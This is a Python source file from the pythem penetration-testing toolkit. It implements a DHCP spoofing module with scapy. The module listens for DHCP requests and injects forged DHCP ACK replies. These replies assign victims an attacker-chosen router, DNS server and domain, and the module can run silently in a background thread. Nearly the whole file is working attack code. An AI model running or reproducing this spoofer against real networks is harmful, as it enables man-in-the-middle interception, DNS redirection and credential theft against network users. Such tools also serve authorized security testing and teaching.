#!/usr/bin/env python2.7
# coding=UTF-8

# Copyright (c) 2016-2018 Angelo Moura
#
# This file is part of the program pythem
#
# pythem is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA

import sys
import threading
from scapy.all import *


class DHCPspoof(object):
    name = "DHCP Spoofing"
    desc = "DHCP ACK injection with DHCP Request monitor callback"
    version = "0.1"

    def __init__(self, mode):
        if mode == "test":
            return
        try:
            self.dhcp_server_ip = raw_input("[+] DHCP Server IP address: ")
            self.lease = 43200  # input("[+] Lease time: ")
            self.renewal = 21600  # input("[+] Renewal time: ")
            self.rebinding = 37800  # input("[+] Rebinding time: ")
            self.broadcast = raw_input("[+] Broadcast address: ")
            self.subnet = raw_input("[+] Subnet mask: ")
            self.router_ip = raw_input("[+] Router IP address: ")
            self.domain = raw_input("[+] Domain: ")
            self.dns_server = raw_input("[+] DNS Server IP address: ")
        except Exception as e:
            print "[!] Exception caught: {}".format(e)
        except KeyboardInterrupt:
            exit(0)

        if mode == "silent":
            t = threading.Thread(name="DHCPspoof", target=self.spoof)
            t.setDaemon(True)
            t.start()
        else:
            self.spoof()

    def spoof(self):
        sniff(filter="udp and port 67 or port 68", prn=self.callback, store=0)

    def callback(self, p):
        if p.haslayer(DHCP):
            mtype = p[DHCP].options
            if mtype[0][1] == 3:
                self.victim_mac = p[Ether].src
                try:
                    for x, y in mtype:
                        if x == "requested_addr":
                            self.victim_ip = (x, y)
                            # DEBUG print "{}".format(self.victim_ip)
                        if x == "hostname":
                            self.hostname = (x, y)
                            # DEBUG print "{}".format(self.hostname)
                except Exception as e:
                    # print "[!] Exception at try at line 99: {}".format(e)
                    pass

                try:
                    # Ether(src=self.dhcp_server_mac,dst=p[Ether].src)
                    self.dhcp_ack = Ether() / IP(id=0, tos=16, ttl=16, src=self.dhcp_server_ip, dst=self.victim_ip[1],
                                                 chksum=0) / \
                                    UDP(sport=67, dport=68, chksum=0) / \
                                    BOOTP(op=2, yiaddr=self.victim_ip[1], ciaddr='0.0.0.0', siaddr=self.dhcp_server_ip,
                                          giaddr='0.0.0.0', chaddr='$\nd]\xe8h\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
                                          sname='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
                                          file='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
                                          xid=p[BOOTP].xid) / \
                                    DHCP(options=[('message-type', 5),
                                                  ('server_id', self.dhcp_server_ip),
                                                  ('lease_time', self.lease),
                                                  ('renewal_time', self.renewal),
                                                  ('rebinding_time', self.rebinding),
                                                  ('subnet_mask', self.subnet),
                                                  ('broadcast_address', self.broadcast),
                                                  ('time_zone', '\x00\x00\x00\x00'),
                                                  ('router', self.router_ip),
                                                  ('domain', self.domain),
                                                  ('name_server', self.dns_server),
                                                  ('hostname', self.hostname[1]),
                                                  ('end')])
                    del self.dhcp_ack[IP].chksum
                    del self.dhcp_ack[UDP].chksum
                    del self.dhcp_ack[IP].len
                    del self.dhcp_ack[UDP].len
                    dhcp_ack = self.dhcp_ack.__class__(str(self.dhcp_ack))
                    # DEBUG dhcp_ack.show()
                    sendp(dhcp_ack, verbose=0)
                except Exception as e:
                    print "[!] Exception at try at line 110: {}".format(e)
                    pass


if __name__ == "__main__":
    try:
        if sys.argv[2] == "-h" or sys.argv[2] == "--help":
            print "[pythem DHCP spoofer]"
            print
            print "usage:"
            print "  python dhcpoisoner.py"
            exit()
        else:
            print "Select a valid option, for help run: python dhcpoisoner.py -h"
    except IndexError:
        DHCPspoof("verbose")

    except Exception as e:
        print "[!] Exception caught: {}".format(e)
